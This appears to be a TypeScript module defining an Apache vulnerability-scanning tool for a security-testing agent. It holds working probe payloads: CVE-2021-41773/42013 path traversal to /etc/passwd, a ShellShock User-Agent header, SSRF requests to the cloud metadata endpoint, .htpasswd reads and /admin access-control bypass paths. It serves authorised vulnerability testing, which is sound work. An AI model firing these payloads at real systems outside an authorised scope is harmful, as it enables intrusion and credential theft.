// apache stack checks — ported from infra-security-mcp `providers/apache`.
import z from "zod"
import { defineWebhookTool } from "../define"
import type { HttpSender } from "../transport"
import { get, header, failed, ok, base, summarize, type Check } from "./shared"

export namespace Apache {
  export async function version(sender: HttpSender, origin: string): Promise<Check> {
    const [root, miss] = await Promise.all([get(sender, origin), get(sender, `${origin}/__404_${Date.now()}__`)])
    const hay = [root, miss].filter(ok).map((r) => `${header(r, "server")} ${r.body.slice(0, 4000)}`).join(" ")
    const ver = hay.match(/Apache\/([\d.]+)/i)
    if (!ver) return { check: "version", hit: false, severity: "info", detail: "Apache version not disclosed" }
    const mods = [...new Set([...hay.matchAll(/\bmod_\w+/gi)].map((m) => m[0]))]
    const extra = [hay.match(/OpenSSL\/[\w.]+/i)?.[0], hay.match(/PHP\/[\d.]+/i)?.[0]].filter(Boolean) as string[]
    return {
      check: "version",
      hit: true,
      severity: "low",
      detail: `Apache ${ver[1]} disclosed${extra.length ? ` (${extra.join(", ")})` : ""}`,
      evidence: [ver[0], ...mods, ...extra].join(" "),
    }
  }

  export async function serverStatus(sender: HttpSender, origin: string): Promise<Check> {
    const paths = ["/server-status", "/server-status?auto", "/server-info", "/server-info?auto"]
    const sigs = ["Apache Server Status", "Scoreboard", "Module Name", "Total Accesses"]
    for (const p of paths) {
      const res = await get(sender, `${origin}${p}`)
      if (failed(res)) continue
      if (res.status === 200 && sigs.some((s) => res.body.includes(s)))
        return { check: "server_status", hit: true, severity: "medium", detail: `mod_status/mod_info exposed at ${p}`, evidence: res.body.slice(0, 300) }
    }
    return { check: "server_status", hit: false, severity: "info", detail: "mod_status/mod_info not exposed" }
  }

  export async function htaccessBypass(sender: HttpSender, origin: string): Promise<Check> {
    const files = ["/.htaccess", "/.htpasswd", "/.htaccess.bak", "/.htaccess.swp", "/.htaccess~", "/%2e%68taccess", "/.htaccess.save", "/admin/.htaccess"]
    for (const f of files) {
      const res = await get(sender, `${origin}${f}`)
      if (failed(res)) continue
      if (res.status === 200 && /(AuthType|Require |RewriteRule|Order |Deny from|\$apr1\$|:\$)/.test(res.body))
        return { check: "htaccess_bypass", hit: true, severity: "high", detail: `.htaccess/.htpasswd readable at ${f}`, evidence: res.body.slice(0, 300) }
    }
    const guard = await get(sender, `${origin}/admin`)
    if (ok(guard) && (guard.status === 401 || guard.status === 403)) {
      for (const trick of ["/admin/", "/admin%20", "/admin%0a", "/admin/.", "/admin..;/", "/admin%2f", "/admin%00"]) {
        const res = await get(sender, `${origin}${trick}`)
        if (ok(res) && res.status === 200)
          return { check: "htaccess_bypass", hit: true, severity: "high", detail: `access-control bypass on /admin via ${trick}`, evidence: `guard=${guard.status} bypass=${res.status}` }
      }
    }
    return { check: "htaccess_bypass", hit: false, severity: "info", detail: "no .htaccess leak or /admin bypass" }
  }

  export async function modProxySsrf(sender: HttpSender, origin: string): Promise<Check> {
    const paths = ["/proxy/127.0.0.1", "/redirect?url=http://169.254.169.254/latest/meta-data/", "/?url=http://127.0.0.1", "/fetch?target=http://169.254.169.254/latest/meta-data/"]
    for (const p of paths) {
      const res = await get(sender, `${origin}${p}`)
      if (failed(res)) continue
      if (res.status === 200 && /(ami-id|instance-id|iam\/security-credentials|meta-data\/)/.test(res.body))
        return { check: "mod_proxy_ssrf", hit: true, severity: "critical", detail: `mod_proxy SSRF to cloud metadata via ${p}`, evidence: res.body.slice(0, 300) }
    }
    return { check: "mod_proxy_ssrf", hit: false, severity: "info", detail: "no mod_proxy SSRF confirmed" }
  }

  export async function pathTraversal(sender: HttpSender, origin: string): Promise<Check> {
    const payloads = [
      "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
      "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
      "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
      "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/etc/passwd",
    ]
    for (const p of payloads) {
      const res = await get(sender, `${origin}${p}`)
      if (failed(res)) continue
      if (res.status === 200 && res.body.includes("root:") && res.body.includes("/bin/"))
        return { check: "path_traversal", hit: true, severity: "critical", detail: `CVE-2021-41773/42013 path traversal via ${p}`, evidence: res.body.slice(0, 200) }
    }
    return { check: "path_traversal", hit: false, severity: "info", detail: "not vulnerable to CVE-2021-41773/42013" }
  }

  export async function cgiRce(sender: HttpSender, origin: string): Promise<Check> {
    const scripts = ["/cgi-bin/", "/cgi-bin/printenv", "/cgi-bin/test-cgi", "/cgi-bin/env.cgi", "/cgi-bin/status"]
    for (const s of scripts) {
      const res = await get(sender, `${origin}${s}`)
      if (failed(res)) continue
      if (res.status !== 200 || !/(SERVER_SOFTWARE|GATEWAY_INTERFACE|DOCUMENT_ROOT)/.test(res.body)) continue
      const shock = await get(sender, `${origin}${s}`, { "User-Agent": "() { :; }; echo; echo SHELLSHOCK_TEST_MARKER" })
      if (ok(shock) && shock.body.includes("SHELLSHOCK_TEST_MARKER"))
        return { check: "cgi_rce", hit: true, severity: "critical", detail: `ShellShock (CVE-2014-6271) RCE via ${s}`, evidence: "marker echoed by CGI" }
      return { check: "cgi_rce", hit: true, severity: "medium", detail: `CGI script exposed at ${s}`, evidence: res.body.slice(0, 200) }
    }
    return { check: "cgi_rce", hit: false, severity: "info", detail: "no exposed CGI / ShellShock" }
  }

  const RUNNERS: Record<string, (s: HttpSender, o: string) => Promise<Check>> = {
    version,
    server_status: serverStatus,
    htaccess_bypass: htaccessBypass,
    mod_proxy_ssrf: modProxySsrf,
    path_traversal: pathTraversal,
    cgi_rce: cgiRce,
  }

  export async function run(sender: HttpSender, origin: string, which: string): Promise<Check[]> {
    const names = which === "all" ? Object.keys(RUNNERS) : [which]
    const out: Check[] = []
    for (const n of names) out.push(await RUNNERS[n](sender, origin))
    return out
  }
}

const DESCRIPTION = `Apache httpd deterministic checks (version/module disclosure, mod_status/mod_info exposure, .htaccess leak + access-control bypass, mod_proxy SSRF, CVE-2021-41773/42013 path traversal, CGI exposure + ShellShock).

Run after Vortex fingerprints Apache (technology:apache) or a Server header reveals it. Probes go through the scope-guarded replay engine. check="all" (default) runs every check.`

export const ApacheTestTool = defineWebhookTool({
  name: "apache_test",
  description: DESCRIPTION,
  parameters: z.object({
    target: z.string().describe("Target origin or URL (e.g. https://target.com)."),
    check: z
      .enum(["all", "version", "server_status", "htaccess_bypass", "mod_proxy_ssrf", "path_traversal", "cgi_rce"])
      .default("all")
      .describe("Which check to run; 'all' runs every Apache check."),
  }),
  async run(params, ctx) {
    const origin = base(params.target)
    const results = await Apache.run(ctx.sender, origin, params.check)
    return { target: origin, results }
  },
  format(r) {
    return summarize("apache_test", r.target, r.results)
  },
})
